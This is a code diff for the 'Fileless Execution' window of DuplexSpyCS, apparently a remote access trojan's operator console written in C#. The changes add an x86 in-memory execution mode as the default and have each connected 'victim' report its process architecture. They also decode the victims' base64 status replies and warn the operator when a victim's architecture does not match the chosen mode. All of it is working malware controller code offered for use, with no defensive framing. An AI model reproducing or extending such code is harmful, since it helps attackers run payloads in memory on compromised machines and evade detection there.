@@ -34,31 +34,27 @@ namespace DuplexSpyCS
 
             if (lsMsg[0] == "fle") //Fileless Execution
             {
-                int nCode = int.Parse(lsMsg[2]);
-                string szMsg = lsMsg[3];
-
                 Invoke(new Action(() =>
                 {
                     ListViewItem item = listView1.FindItemWithText(victim.ID, true, 0);
+                    if (item == null)
+                        return;
 
-                    if (nCode == 0)
+                    if (lsMsg[1] == "init")
                     {
-                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
+                        string szPlatform = lsMsg[2];
+                        item.SubItems[1].Text = szPlatform;
 
-                        if (item == null)
-                            return;
-
-                        item.SubItems[1].Text = "Failed";
+                        return;
                     }
-                    else
-                    {
-                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] OK");
 
-                        if (item == null)
-                            return;
+                    //The following codes below cannot be executed if lsMsg[1] == "init".
 
-                        item.SubItems[1].Text = "OK";
-                    }
+                    int nCode = int.Parse(lsMsg[2]);
+                    string szMsg = clsCrypto.b64D2Str(lsMsg[3]);
+
+                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
+                    item.SubItems[2].Text = nCode == 0 ? "Failed" : szMsg;
                 }));
             }
         }
@@ -95,7 +91,17 @@ namespace DuplexSpyCS
                     break;
                 }
 
-                if (radioButton1.Checked)
+                if (radioButton3.Checked)
+                {
+                    v.fnSendCommand(new string[]
+                    {
+                        "fle",
+                        "x86",
+                        string.Empty,
+                        szData
+                    });
+                }
+                else if (radioButton1.Checked)
                 {
                     v.fnSendCommand(new string[]
                     {
@@ -124,21 +130,29 @@ namespace DuplexSpyCS
             listView1.FullRowSelect = true;
             listView1.CheckBoxes = true;
 
+            Text = $"Fileless Execution | Victim[{m_lsVictim.Count}]";
             toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
             toolStripStatusLabel2.Text = string.Empty;
 
-            radioButton1.Checked = true;
+            radioButton3.Checked = true;
 
             //setup
             foreach (clsVictim v in m_lsVictim)
             {
                 ListViewItem item = new ListViewItem(v.ID);
                 item.SubItems.Add("?");
+                item.SubItems.Add("?");
                 item.Tag = v;
 
                 listView1.Items.Add(item);
 
                 v.m_listener.ReceivedDecoded += fnRecv;
+
+                v.fnSendCommand(new string[]
+                {
+                    "fle",
+                    "init",
+                });
             }
         }
 
@@ -179,6 +193,52 @@ namespace DuplexSpyCS
             {
                 MessageBox.Show("File not found: " + szFileName, "FileNotExists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
+            }
+
+            List<ListViewItem> items = listView1.CheckedItems.Cast<ListViewItem>().ToList();
+            List<string> lsProc = items.Select(x => x.SubItems[1].Text).Where(y => !string.Equals(y, "?")).ToList();
+            if (lsProc.Count == 0 && !radioButton2.Checked)
+            {
+                DialogResult dr = MessageBox.Show(
+                    "There is victim with unknown process architecture\n" +
+                    "Are you sure to continue?",
+                    "Warning",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Warning,
+                    MessageBoxDefaultButton.Button2
+                );
+
+                if (dr != DialogResult.Yes)
+                    return;
+            }
+
+            if (radioButton3.Checked && lsProc.Contains("x64")) //x86
+            {
+                DialogResult dr = MessageBox.Show(
+                    "There is process on remote machine is running with x64 architecture.\n" +
+                    "Are you sure to continue?",
+                    "Warning",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Warning,
+                    MessageBoxDefaultButton.Button2
+                );
+
+                if (dr != DialogResult.Yes)
+                    return;
+            }
+            else if (radioButton1.Checked && lsProc.Contains("x86")) //x64
+            {
+                DialogResult dr = MessageBox.Show(
+                    "There is process on remote machine is running with x86 architecture.\n" +
+                    "Are you sure to continue?",
+                    "Warning",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Warning,
+                    MessageBoxDefaultButton.Button2
+                );
+
+                if (dr != DialogResult.Yes)
+                    return;
             }
 
             string[] alpArgs = szArgs.Split(' ');
@@ -222,6 +282,11 @@ namespace DuplexSpyCS
         {
             foreach (var victim in m_lsVictim)
                 victim.m_listener.ReceivedDecoded -= fnRecv;
+        }
+
+        private void radioButton3_CheckedChanged(object sender, EventArgs e)
+        {
+            textBox2.Enabled = !radioButton3.Checked;
         }
     }
 }
